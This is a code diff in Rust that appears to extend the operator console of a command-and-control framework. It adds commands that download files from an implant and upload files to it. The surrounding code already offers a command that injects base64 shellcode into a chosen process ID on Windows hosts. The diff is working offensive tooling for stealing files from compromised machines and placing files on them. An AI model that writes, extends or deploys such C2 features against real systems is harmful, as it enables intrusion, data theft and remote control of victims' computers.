@@ -252,6 +252,39 @@ fn interact(links: &Arc<Mutex<Links>>, link_id: Uuid, rl: &mut DefaultEditor) {
                         }
                     }
 
+                    // ── File operations ─────────────────────────────────
+                    "download" => {
+                        if args.is_empty() {
+                            ui::print("Usage: download <remote_path>");
+                        } else {
+                            let mut l = links.lock().unwrap();
+                            if let Some(id) = l.get_link(link_id).map(|link| link.id) {
+                                l.add_download_task(id, args.to_string());
+                                ui::print(&format!("{} Download task queued.", "[+]".green()));
+                            }
+                        }
+                    }
+                    "upload" => {
+                        let parts: Vec<&str> = args.split_whitespace().collect();
+                        if parts.len() < 2 {
+                            ui::print("Usage: upload <local_path> <remote_path>");
+                        } else {
+                            let local_path = parts[0].to_string();
+                            let remote_path = parts[1..].join(" ");
+                            let mut l = links.lock().unwrap();
+                            if let Some(id) = l.get_link(link_id).map(|link| link.id) {
+                                if l.add_upload_task(id, local_path, remote_path).is_some() {
+                                    ui::print(&format!("{} Upload task queued.", "[+]".green()));
+                                } else {
+                                    ui::print(&format!(
+                                        "{} Failed to read local file.",
+                                        "[-]".red()
+                                    ));
+                                }
+                            }
+                        }
+                    }
+
                     // ── Process injection ───────────────────────────────
                     "inject" => {
                         if !is_windows(links, link_id) {
@@ -358,6 +391,8 @@ fn print_link_help() {
     ui::print("  pid                 Process ID");
     ui::print("  integrity           Token integrity level");
     ui::print("  inject <pid> <b64>  Inject base64 shellcode into PID");
+    ui::print("  download <path>     Download file from implant");
+    ui::print("  upload <local> <remote> Upload file to implant");
     ui::print("  info                Show link metadata");
     ui::print("  kill                Send exit + mark link dead");
     ui::print("  back                Return to links menu");
